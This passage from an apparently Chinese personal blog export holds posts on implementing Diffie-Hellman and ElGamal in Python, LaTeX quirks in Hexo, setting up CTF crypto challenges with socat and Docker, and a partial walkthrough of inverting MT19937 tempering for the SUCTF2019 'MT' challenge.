= getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私钥生成</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">KA = l_pow(TA, y, p)</span><br><span class="line">KB = l_pow(TB, x, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> KA == KB</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密钥交换成功，你的私钥很安全&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行的结果是<br><img alt="DH协议及ElGamal加密方案的实现-f7c0a2dc.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-f7c0a2dc.png" width="" height="" ></p>
<p>看来以后还要看看怎么有效找生成元的算法（其实sage里面早就有了，看文末）</p>
<p>所以小节一下，显然AB共享的来自两个随机生成的随机数，两人并不能控制其内容，所以作为密钥更为合理</p>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>虽然DH方案本身挺好好，但之所以说它没有的使用，是因为存在中间人攻击</p>
<p>（从网上抄来的，因为觉得自己对这个还有点模糊，但看了之后清楚一些）<br>其攻击思路如下：</p>
<ol>
<li>Alice发送公钥$T_A$给Bob, 中间人Eve截取该值，并选择了一个自己的私钥$z$，计算出自己的公钥$_C=g^c\bmod\ q$然后发送自己的公钥给Bob</li>
<li>Bob向Alice传递自己的公钥$T_B$时，也被中间人Eve截获该值，Eve代替Bob发送它自己的公共值$T_C$给Alice</li>
<li>此时，Alice收到中间人Eve的公钥，Alice和EVE计算出会话密钥$K_{AC}=g^{xz}\bmod\ q$，Bob也收到中间人发送的公钥，Bob和Eve计算出会话密钥$K_{BC}=g^{yz}\bmod\ q$</li>
<li>Alice和Bob都以为是和对方协商好了会话密钥，于是双方互相发送数据，Alice用$K_{AC}$加密数据之后发送给Bob，Eve截获该数据，用$K_{AC}$解密，即可查看Alice发送给Bob的数据，Eve还可对其进行修改，然后用$K_{BC}$加密发送给Bob，这时Bob收到的消息已经被中间人Eve窥探甚至篡改，但Bob对此毫不知情</li>
</ol>
<p>这就是中间人攻击的原理，妙，给我感觉DH协议具有传递性哈哈哈哈哈哈</p>
<p>这里的理解需要注意几点，我一开始就是没搞清楚这个，举个例子就是，Alice不能100%肯定自己手中的共享私钥就是Bob手中的那个，而且他们没有办法确认，这就是一开始接触密码学里的那条悖论</p>
<blockquote>
<p>对称密码，用秘密（私钥）守护秘密（明文），那怎么能确保前一个秘密的安全性，不会被Eve监听呢；如果既然有保护第一个秘密（私钥）的方法，那为什么不用这个方法来保护第二个秘密（明文）呢</p>
</blockquote>
<p>密码学还讲博弈</p>
<h2 id="ElGamal加密方案"><a href="#ElGamal加密方案" class="headerlink" title="ElGamal加密方案"></a>ElGamal加密方案</h2><p>最后终于到了我们的ElGamal加密算法，讲完DH，ElGamal其实已经讲完一半了</p>
<p>因为ElGamal和DH真的好像，正如老师上课说的，DH他们怎么就没想到ElGamal呢，明明只是一步之遥（当然是大牛的一步）</p>
<p>视觉疲劳了，先写代码，拿出我们熟悉的long_to_bytes，bytes_to_long</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long <span class="keyword">as</span> b2n, long_to_bytes <span class="keyword">as</span> n2b</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> l_pow, my_inverse</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key generation</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">pk = [p, g, TA]</span><br><span class="line">sk = x</span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption</span></span><br><span class="line">flag = <span class="string">b&quot;f&quot;</span></span><br><span class="line">m = b2n(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">ci = l_pow(g, y, p)</span><br><span class="line">ciphertext = m * l_pow(TA, y, p) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># decryption</span></span><br><span class="line">mi = ciphertext * my_inverse(l_pow(ci, x, p), p) % p</span><br><span class="line"><span class="built_in">print</span>(n2b(mi))</span><br></pre></td></tr></table></figure>

<p>由于求生成元的问题所限制，p不能取得太大，这也就连带着明文不能太长，不能超过16位比特，屑，这能加密个啥</p>
<p>但好歹最后的结果是一样的</p>
<img alt="DH协议及ElGamal加密方案的实现-586e337d.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-586e337d.png" width="" height="" >

<p>手写了一下加密解密过程，打公式太耗时了</p>
<img alt="DH协议及ElGamal加密方案的实现-966d65b9.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-966d65b9.png" width="" height="">

<p>应该可以理解，主要就是用DH里面的共享私钥乘以明文m进行加密，然后把共享私钥作为密文的一部分发送，然后除以（这里相当于求逆元）共享私钥就是明文了</p>
<p>所以说，ElGamal才会和DH那么有关联，密钥共享共享的就是ElGamal里面的密钥</p>
<p>那么这样Alice和Bob就能通过明文对进行验证了，中间人即使改变了私钥和Alice与Bob分别建立链接，但是依旧无法知晓明文的内容，因为只有x才能将明文解密，Eve只能创造一个z，而Alice和Bob却可以通过解密出来的内容是否是乱码检查是否存在中间人（我的理解）</p>
<h2 id="求原根的有效方法"><a href="#求原根的有效方法" class="headerlink" title="求原根的有效方法"></a>求原根的有效方法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">gp (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">pari (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>emmmmm好吧当我没说<br><img alt="DH协议及ElGamal加密方案的实现-c224eccd.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-c224eccd.png" width="" height=""></p>
<p>或许可以参考<a href="https://blog.csdn.net/weixin_44932880/article/details/106555427">这个博客里的</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于ElGamal和DH的关系，到这里想必都已经挺透彻的了，DLP保证了私钥的安全性即知道$g^x$，得不到x，DH则保证了有$g^x，g^y$也得不到$g^{xy}$</p>
<p>这就应证了，ElGamal基于DH，DH基于DL</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>基层知识学习</category>
      </categories>
      <tags>
        <tag>DH协议</tag>
        <tag>Elgamal</tag>
      </tags>
  </entry>
  <entry>
    <title>Latex在Hexo中的坑</title>
    <url>/posts/9cc052fc/</url>
    <content><![CDATA[<p>Typora里的latex很好看，也很实用，github和vscode这些限制比较多，但也主要是换行改成<code>\newline</code>或者<code>\\\\</code>，这个文档主要针对latex在hexo上使用，出现的一些问题</p>
<span id="more"></span>

<h1 id="Latex在Hexo中的坑"><a href="#Latex在Hexo中的坑" class="headerlink" title="Latex在Hexo中的坑"></a>Latex在Hexo中的坑</h1><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>很奇怪，大括号内换行，四个<code>/</code>就换过去了，但是其他的地方不行</p>
<p>所以只能这样了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;align&#125;</span><br><span class="line">g_1=g^&#123;r_1\times(p-1)&#125;\ mod\ N\\\\</span><br><span class="line">g_2=g^&#123;r_2\times(q-1)&#125;\ mod\ N</span><br><span class="line">\end&#123;align&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007165137679.png" alt="image-20211007165137679"></p>
<p>还行，也就是亿点麻烦</p>
<h2 id="方程组大括号"><a href="#方程组大括号" class="headerlink" title="方程组大括号"></a>方程组大括号</h2><p>woc，博客里出现这样效果，我真的爱了哇</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007161605021.png" alt="image-20211007161605021"></p>
<p><strong>模板</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;cases&#125;</span><br><span class="line">x\equiv cs_1\ (mod\ ms_1)\\\\</span><br><span class="line">x\equiv cs_2\ (mod\ ms_2)\\\\</span><br><span class="line">\vdots\qquad \vdots \qquad\qquad \vdots\\\\</span><br><span class="line">x\equiv cs_8\ (mod\ ms_8)\\\\</span><br><span class="line">x\equiv cs_9\ (mod\ ms_9)    </span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Latex</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF密码题是怎么炼成的</title>
    <url>/posts/921543e1/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="CTF密码题是怎么炼成的"><a href="#CTF密码题是怎么炼成的" class="headerlink" title="CTF密码题是怎么炼成的"></a>CTF密码题是怎么炼成的</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>web和pwn的出题会用到docker的相关操作，出pwn题，有个大佬写了个<a href="https://github.com/giantbranch/pwn_deploy_chroot">脚本</a>一键搭</p>
<p>而Crypto出题就不用那么麻烦（指环境搭建），可以只写下python脚本就好，主要还是对服务器进行配置吧，想起了某段时间，我一直在配置pwn环境的虚拟机，<em>先虚拟机，再vim，再换源，再zsh，on-my-zsh，再vim主题哈哈哈哈哈</em>，pwn用到的环境以及一些工具主要参考的是<a href="https://blog.csdn.net/Y_peak/article/details/112850307">这位师傅的博客</a>，写得太好了，这里需要用到pwntools工具写脚本</p>
<p>Crypto用到的一些东西之前装过很多次，主要的问题罗列了一下，我的服务器系统镜像是ubuntu18的，一些之后课上的使用技巧和遇到问题的解决，预期发一篇博客，咕咕咕？</p>
<ul>
<li><p>python2安装gmpy2，<a href="https://leefige.github.io/2021/03/11/%E5%AE%89%E8%A3%85gmpy2/">查看这位师傅的博客</a>，python3的安装看<a href="https://blog.csdn.net/qq_28573835/article/details/86164877">这位师傅的</a>就好了</p>
<p>前者中途如果报了个什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/gmpy2.c:445:10: fatal error: Python.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include <span class="string">&quot;Python.h&quot;</span></span></span><br><span class="line">          ^~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1</span><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913095633149.png" alt="image-20210913095633149"></p>
<p>执行下这个命令<code>sudo apt-get install python-dev</code>安装下就好了</p>
</li>
<li><p>Crypto库的安装，win下安装就是要改个名，linux下更简单，后者可以看<a href="https://blog.csdn.net/qq_45000214/article/details/106222660">这位师傅的博客</a></p>
</li>
<li><p>如果要安装sage，参考<a href="https://blog.csdn.net/ckm1607011/article/details/106724624">这位师傅的博客</a>，怎么获取最新版的忘了，之前好不容易把子系统的sage搞成9的</p>
</li>
<li><p>最后是我还看得顺眼的vim主题<a href="https://link.csdn.net/?target=https://github.com/sickill/vim-monokai">monokai</a>，以及如何下载<a href="https://www.cnblogs.com/woniu201/p/10304197.html">Vundle</a>（两款管理vim插件的插件），还有我一般的vim配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nocompatible &quot; be iMproved, required</span><br><span class="line">filetype off &quot; required</span><br><span class="line">&quot; set the runtime path to include Vundle and initialize</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; alternatively, pass a path where Vundle should install plugins</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line">&quot; let Vundle manage Vundle, required</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line">Plugin &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plugin &#x27;kien/ctrlp.vim&#x27;</span><br><span class="line">Plugin &#x27;vim-airline/vim-airline&#x27;</span><br><span class="line">Plugin &#x27;jiangmiao/auto-pairs&#x27;</span><br><span class="line">Plugin &#x27;powerline/powerline&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdcommenter&#x27;</span><br><span class="line">Plugin &#x27;vim-scripts/a.vim&#x27;</span><br><span class="line">call vundle#end() &quot; required</span><br><span class="line">filetype plugin indent on &quot; required</span><br><span class="line"></span><br><span class="line">set nocompatible</span><br><span class="line">set backspace=indent,eol,start</span><br><span class="line"></span><br><span class="line">&quot;激活鼠标</span><br><span class="line">set mouse=a</span><br><span class="line"></span><br><span class="line">&quot;显示行号</span><br><span class="line">set nu</span><br><span class="line"></span><br><span class="line">&quot;设置制表符宽度为4</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置软制表符宽度为4</span><br><span class="line">set softtabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置缩进的空格数为4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">&quot;设置自动缩进</span><br><span class="line">set autoindent</span><br><span class="line"></span><br><span class="line">&quot;设置使用c/c++语言的自动缩进方式</span><br><span class="line">set cindent</span><br><span class="line"></span><br><span class="line">&quot;tab键宽度</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot;主题颜色</span><br><span class="line">colorscheme monokai</span><br><span class="line"></span><br><span class="line">&quot;NERDTree快捷键</span><br><span class="line">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot;NERDTree剩下一个窗口时自动关闭</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br><span class="line"></span><br><span class="line">&quot;ctrlp配置&quot;</span><br><span class="line">set runtimepath^=~/.vim/plugged/ctrlp.vim</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;r :NERDTreeFind&lt;cr&gt;</span><br><span class="line"></span><br><span class="line">&quot;控制vim窗口分界线位置</span><br><span class="line">map &lt;F2&gt; &lt;ESC&gt;&lt;C-W&gt;-</span><br><span class="line">map &lt;F3&gt; &lt;ESC&gt;&lt;C-W&gt;+</span><br><span class="line">map &lt;F4&gt; &lt;ESC&gt;&lt;C-W&gt;&lt;</span><br><span class="line">map &lt;F5&gt; &lt;ESC&gt;&lt;C-W&gt;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>接下来正式开始</p>
<p>主要参考<a href="https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/">这位师傅的</a>，好吧我是缝合怪</p>
<h2 id="将题目挂到服务器上的一般姿势"><a href="#将题目挂到服务器上的一般姿势" class="headerlink" title="将题目挂到服务器上的一般姿势"></a>将题目挂到服务器上的一般姿势</h2><p><em>一开始我还以为是用nc来挂，然后就在小破站上学了netcat，然后发现好像是用socat，难怪程序员这么喜欢猫</em></p>
<p>一道Crypto题目的搭建主要有两部分，与题目有关的代码文件server.py，以及将程序跑在服务器端口上的代码文件run.py组成</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913214156007.png" alt="image-20210913214156007"></p>
<p>我暂时接触到的出题模板，题目的python是直接用print的和input的，没有用到socket库；其他的就是题目本身的信息了</p>
<p>然后是启动程序，可以遵循以下模式，可以一直在这个端口运行（端口在运行的时候自己选择，阿里云的服务器是要在工作台开起来先）；还有开启防火墙端口的操作，可以直接看上面这位大师傅的，我一般复现只开一个端口，做一次后面就一劳永逸了好像</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<p>虽然<code>ctrl+c</code>退出就结束了，不是很清楚他们比赛的时候是怎么操作的，每个端口开一个题目难道都要一直挂着？不过目前够我用就行</p>
<h2 id="用Docker打包的姿势"><a href="#用Docker打包的姿势" class="headerlink" title="用Docker打包的姿势"></a>用Docker打包的姿势</h2><p>在没接触过docker之前，觉得写dockerfile好难，这里师傅有模板，我们按照他的做一遍</p>
<p>原理其实差不多，只不过上面是在服务器上配置好了整个程序运行需要的东西，用docker则相当于在服务器上开了个虚拟机，并且通过dockerfile对其进行坏境的配置，将题目放在这个环境中跑</p>
<p>文件夹的结构就是这样的了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000241836.png" alt="image-20210914000241836"></p>
<p>让我们研究下这个dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定制的镜像是基于FROM的镜像，这里是运行python脚本，需要安装一个python，apline是linux操作系统？</span></span><br><span class="line"><span class="comment"># LABEL以键值对的形式添加元数据，似乎是关于作者版本之类的</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Description=<span class="string">&quot;Game&quot;</span> VERSION=<span class="string">&#x27;1.0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN后面紧跟shell命令，和命令行一样方便；还有另一种执行文件跟参数的命令，用到时查</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; apk add gcc g++ make openssl-dev python3-dev libffi-dev autoconf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WORKDIR指定工作目录，mkdir [-p] 确保目录名称存在，不存在的就建一个</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/game</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/game</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制指令，从上下文目录中复制文件或者目录到容器里指定路径，.应该是表示当前目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> task.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> secret.py .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EXPOSE声明端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD在docker run时运行；RUN是在docker build</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;task.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>本地搭建测试</strong></p>
<ol>
<li><p>build镜像<code>docker build . -t wmctf-game</code></p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000656526.png" alt="image-20210914000656526"></p>
<p>真的好慢，毕竟是在搭环境了，赛方只要搭建一次，以后开新的容器就好</p>
<p>今天晚上没有跑完，明天起来继续</p>
<p>就可慢，连了实验室的网，也要断开几次，重新执行，最后才好</p>
</li>
<li><p><code>docker images</code>查看一下</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101621134.png" alt="image-20210914101621134"></p>
</li>
<li><p>创建一个containter容器<code>docker run --name game -d -p 10001:10001 wmctf-game</code>，-d是run了之后不进入container内部，这样就可以一个窗口开多道题目了吧；-p是将container内部的端口映射到本地的10001端口</p>
<p>不知道返回的那一串东西是什么，想要停止的话可以先<code>docker stop [container id]</code>，然后再删除<code>docker rm [container id]</code></p>
</li>
<li><p><code>docker container ls</code>查看这个容器是否已经运行</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101715144.png" alt="image-20210914101715144"></p>
</li>
<li><p>最后用exp打，纳尼，exp呢，算了，能连上就成功一半（bushi）</p>
</li>
</ol>
</li>
</ul>
<p>没连上第一次，不知道是不是这里的问题</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914102947812.png" alt="image-20210914102947812"></p>
<p>连不上自己服务器的端口，然后直接用第一种方法复现CSAW了</p>
<p>不过整个出题过程没有问题，如果把这些拿给赛方，差不多就是这样，我这里还没研究透，等WEB服务上到再来填坑吧</p>
<hr>
<p>害其实话说回来，密码题自己复现完全可以写两个python脚本然后手动交互，没必要这么麻烦，毕竟复现的大多时候flag是自己瞎编的；但是整点仪式感吧，嘿嘿</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>MT19937</title>
    <url>/posts/59a1b91b/</url>
    <content><![CDATA[<p>位运算的题目老不会了</p>
<img alt="[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-bdf4ba97.png" width="" height="">

<p>MT19937是伪随机数的生成算法，下面通过一道题目来了解什么是MT19937，以及它如何被预测</p>
<span id="more"></span>

<h1 id="SUCTF2019-MT"><a href="#SUCTF2019-MT" class="headerlink" title="[SUCTF2019]MT"></a>[SUCTF2019]MT</h1><h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>源码稍有改变，代码正规范点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span>     <span class="comment"># 高13位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span>     <span class="comment"># 低9位不变</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span>    <span class="comment"># 低17位不变</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span>     <span class="comment"># 高19位不变</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span>(<span class="params">message</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;transformed_flag:&#x27;</span>, transformed_flag)</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br></pre></td></tr></table></figure>

<h2 id="二、题目解析"><a href="#二、题目解析" class="headerlink" title="二、题目解析"></a>二、题目解析</h2><p>最关键的就是convert这个加密流程了，写了点注释，但怎么感觉像是把明文破坏了</p>
<h3 id="第一四组位运算"><a href="#第一四组位运算" class="headerlink" title="第一四组位运算"></a>第一四组位运算</h3><p>所以，我决定自己试一遍，试了第一组</p>
<p>一试不得了，我发现了，有被修复的可行性的，算法看下图</p>
<img alt="[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-f4ee9bb3.png" width="" height="">

<p>我另外随便（后来发现不能太随便）搞了长度为4的字符来模拟一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_cal_re</span>(<span class="params">c, x</span>):</span></span><br><span class="line">    y = <span class="built_in">len</span>(<span class="built_in">bin</span>(c)[<span class="number">2</span>:])-<span class="number">2</span>*x</span><br><span class="line">    <span class="keyword">assert</span> y &gt; <span class="number">0</span></span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:]</span><br><span class="line">    high13 = c[<span class="number">0</span>:x]</span><br><span class="line">    mid5 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x:x+y], <span class="number">2</span>) ^ <span class="built_in">int</span>(high13[:y], <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    low13 = <span class="built_in">bin</span>(<span class="built_in">int</span>(c[x+y:], <span class="number">2</span>) ^ <span class="built_in">int</span>((high13+mid5)[y:], <span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    flag = <span class="string">b&#x27;abcd&#x27;</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(m)[<span class="number">2</span>:])</span><br><span class="line">    <span class="comment"># m = m 